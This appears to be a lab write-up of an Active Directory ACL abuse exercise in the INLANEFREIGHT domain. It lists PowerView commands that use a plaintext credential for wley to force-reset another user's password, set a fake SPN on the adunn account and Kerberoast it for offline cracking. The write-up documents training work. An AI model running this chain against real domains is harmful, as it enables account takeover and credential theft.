# Content

- [Content](#content)
  - [Question 1](#question-1)
    - [The way to hack](#the-way-to-hack)
    - [Answer](#answer)
  
## Question 1

### The way to hack

- We must authenticate as `wley` and force change the password of the user `damundsen`. We can start by opening a PowerShell console and authenticating as the `wley` user. Otherwise, we could skip this step if we were already running as this user. To do this, we can create a [PSCredential object](https://docs.microsoft.com/en-us/dotnet/api/system.management.automation.pscredential?view=powershellsdk-7.0.0).
- Payload:
  - `$SecPassword = ConvertTo-SecureString '<`transporter@4`>' -AsPlainText -Force`
  - `$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)`
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/15.png)
- Next, we must create a SecureString object which represents the password we want to set for the target user `damundsen`.
- Payload:
  - `$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/16.png)
- Now we change the password of user damundsen.
- Payload:
- `Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose`
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/17.png)
- Now we create s SecureString object using damundsen.
- Payload:
  - `$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force`
  - `$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)`
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/18.png)
- We confirm that damundsen was added to the group.
- Payload:
  - `Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName`
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/19.png)
- We create a fake SPN.
- Payload:
  - `Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose`
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/20.png)
- Finally, I use Kerberoast the user using any number of methods and obtain the hash for offline cracking.
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/21.png)
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/22.png)
- So i copy the hash and come to the terminal in linux to crach the hash.
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/23.png)
  ![Picture](../../Image/An%20ACE%20in%20the%20Hole/24.png)

### Answer

![Picture](../../Image/An%20ACE%20in%20the%20Hole/25.png)

